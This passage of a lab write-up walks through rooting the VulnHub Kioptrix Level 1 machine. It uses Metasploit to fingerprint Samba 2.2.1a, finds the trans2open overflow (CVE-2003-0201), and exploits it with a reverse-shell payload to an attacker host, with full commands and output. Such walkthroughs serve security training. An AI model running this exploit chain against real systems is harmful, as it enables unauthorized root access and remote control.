5. SMB Enumeration

The initial Nmap scan identified SMB on port 139, but did not provide the exact Samba version.

I used Metasploit's SMB version scanner to obtain more information.

┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
└─$ msfconsole

msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS 192.168.1.105
RHOSTS => 192.168.1.105

msf6 auxiliary(scanner/smb/smb_version) > set RPORT 139
RPORT => 139

msf6 auxiliary(scanner/smb/smb_version) > run

[*] 192.168.1.105:139 - SMB Detected
[*] 192.168.1.105:139 - Host could not be identified: Samba 2.2.1a
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

The SMB service was identified as:

Samba 2.2.1a

This was a significant discovery because this version falls within the affected range for the historical trans2open vulnerability.

6. Vulnerability Identification

I searched the identified Samba version against a local exploit database.

┌──(kindgod㉿kali)-[~/vulnhub/kioptrix]
└─$ searchsploit samba 2.2.1a

-------------------------------------------------------------------------------
 Exploit Title
-------------------------------------------------------------------------------
Samba 2.2.x - 'trans2open' Overflow (Linux)
Samba < 2.2.8 - Remote Root Exploit
-------------------------------------------------------------------------------

The relevant vulnerability was:

CVE-2003-0201 — Samba trans2open buffer overflow

The vulnerability affected vulnerable Samba versions and could allow an unauthenticated remote attacker to execute arbitrary code on the target.

The potential impact was particularly severe because exploitation could result in execution with root privileges.

At this point, the SMB service became the primary attack vector.

7. Exploitation
7.1 Selecting the Exploit

I used Metasploit's Samba trans2open exploit module.

msf6 > use exploit/linux/samba/trans2open

The target and SMB port were configured:

msf6 exploit(linux/samba/trans2open) > set RHOST 192.168.1.105
RHOST => 192.168.1.105

msf6 exploit(linux/samba/trans2open) > set RPORT 139
RPORT => 139

For the payload, I used a Linux x86 reverse shell:

msf6 exploit(linux/samba/trans2open) > set PAYLOAD linux/x86/shell_reverse_tcp
PAYLOAD => linux/x86/shell_reverse_tcp

msf6 exploit(linux/samba/trans2open) > set LHOST 192.168.1.50
LHOST => 192.168.1.50

The exploit was then executed.

msf6 exploit(linux/samba/trans2open) > run

[*] Started reverse TCP handler on 192.168.1.50:4444
[*] Trying return address 0xbffffdfc...
[*] Trying return address 0xbffffdfc...
[*] Sending exploit...
[*] Command shell session 1 opened
    (192.168.1.50:4444 -> 192.168.1.105:32775)

A command shell was successfully established.

8. Initial Access Verification

The first step after obtaining the shell was to verify the privilege level.

whoami

Result:

root

I then verified the hostname:

hostname

Result:

kioptrix.level1

This confirmed that the exploitation had achieved:

User: root
Host: kioptrix.level1

No separate privilege-escalation stage was necessary because the remote Samba vulnerability provided root-level command execution directly.

9. Root Access and Flag Retrieval

With root access confirmed, I accessed the root user's home directory.

root@kioptrix.level1:~# ls

flag.txt

The challenge flag was retrieved:

root@kioptrix.level1:~# cat flag.txt

Congrats! You've rooted Kioptrix Level 1!

This confirmed successful completion of the challenge.

